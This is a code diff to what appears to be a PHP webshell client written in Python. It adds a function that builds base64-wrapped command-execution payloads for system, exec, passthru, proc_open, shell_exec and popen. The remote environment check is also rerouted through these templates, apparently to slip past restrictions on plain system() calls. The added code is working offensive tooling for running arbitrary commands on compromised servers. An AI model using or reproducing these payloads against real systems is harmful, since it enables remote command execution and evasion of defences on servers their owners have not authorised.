@@ -11,6 +11,8 @@ from libs.config import color, gset, gget
 
 level = []
 connect_pipe_map = {True: "│  ", False: "   "}
+SYSTEM_TEMPLATE = None
+
 disable_warnings()
 
 
@@ -143,6 +145,28 @@ def print_webshell_info():
         print(name + "\n    " + info + "\n")
 
 
+def get_system_template(exec_func: str):
+    global SYSTEM_TEMPLATE
+    if (not exec_func):
+        SYSTEM_TEMPLATE = ''
+    elif (exec_func == 'system'):
+        SYSTEM_TEMPLATE = """system(base64_decode("%s"));"""
+    elif (exec_func == 'exec'):
+        SYSTEM_TEMPLATE = """$o=array();exec(base64_decode("%s"), $o);$o=join(chr(10),$o);print($o);"""
+    elif (exec_func == 'passthru'):
+        SYSTEM_TEMPLATE = """$o=array();passthru(base64_decode("%s"), $o);$o=join(chr(10),$o);print($o);"""
+    elif (exec_func == 'proc_open'):
+        SYSTEM_TEMPLATE = """$handle=proc_open(base64_decode("%s"),array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);}print($o);@proc_close($handle);"""
+    elif (exec_func == 'shell_exec'):
+        SYSTEM_TEMPLATE = """echo shell_exec(base64_decode("%s"));"""
+    elif (exec_func == 'popen'):
+        SYSTEM_TEMPLATE = """$fp=popen(base64_decode("%s"),'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}print($o);@pclose($fp);"""
+
+
+def get_system_code(command: str):
+    return SYSTEM_TEMPLATE % (base64_encode(command))
+
+
 def is_windows(remote: bool = True):
     if (remote):
         return gget("webshell.iswin", "webshell")
@@ -162,7 +186,7 @@ def has_env(env: str, remote: bool = True):
         command = "which"
     if (remote):
         if (not gget("webshell.has_%s" % env, "webshell")):
-            flag = send(f"system('{command} {env}');").r_text
+            flag = send(get_system_code(f"{command} {env}")).r_text
             gset("webshell.has_%s" % env, flag, namespace="webshell")
         else:
             flag = gget("webshell.has_%s" % env, "webshell")
